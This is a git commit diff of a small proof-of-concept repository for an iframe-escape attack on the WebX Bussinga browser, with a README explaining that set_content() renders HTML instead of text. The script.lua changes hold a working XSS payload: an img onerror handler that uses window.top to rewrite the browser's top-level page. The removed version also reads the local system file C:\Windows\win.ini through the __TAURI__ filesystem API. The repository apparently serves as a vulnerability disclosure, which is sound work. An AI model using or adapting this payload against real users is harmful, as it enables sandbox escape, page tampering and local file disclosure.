8a03da7cb30f9894eeab61c8c625fe1f87ebf990
inventionpro <109528211+inventionpro@users.noreply.github.com>
2026-04-29 23:14:12 +0200

    Update

--- README.md
+++ README.md
@@ -1,8 +1,9 @@
 # Bussinga attack
-An example attack for the WebX bussinga browser.
 
-Bussinga's [Element](https://spec.webxplus.org/lua/legacy/element).set_contents() sets html instead of text.\
+An example attack for the WebX Bussinga browser.
+
+Bussinga's [Element](https://spec.webxplus.org/lua/legacy/element).set_content() sets html instead of text.\
 This allows for a lot of great things, but it can also escape the iframe and attack the browser.\
 An example implementation can be found in [script.lua](./script.lua).
 
-Additionally via the css file there might be a way to do the same but not found to work.
+Blog writeup: https://inv.fsh.plus/blog/2026-04-29-bussinga-browser-explotation
--- script.lua
+++ script.lua
@@ -1,8 +1,9 @@
-if window ~= nil then
-  if window.browser == 'bussinga' then
-    -- The attack
-    -- Since the image has an invalid source, onerror will run
-    -- window.top escapes the iframe and then sets the body to a good messgae :3
-    get('l').set_content('<img src="x" onerror="window.top.document.querySelector(`html`).innerHTML=`<p>men kissing</p>`;__TAURI__.fs.readFile(`C:\Windows\win.ini`).then(res=>window.top.document.querySelector(`html`).innerText=res)">')
-  end
+-- Check if bussinga
+if window and window.browser == 'bussinga' then
+  -- The attack
+  -- Since the image has an invalid source, onerror will run
+  -- window.top escapes the iframe and then sets the body to a good messgae :3
+  get('l').set_content([[
+    <img src="x" onerror="window.top.document.querySelector('body').innerHTML='<p>men kissing</p><style>body{background:white}</style>'">
+  ]])
 end
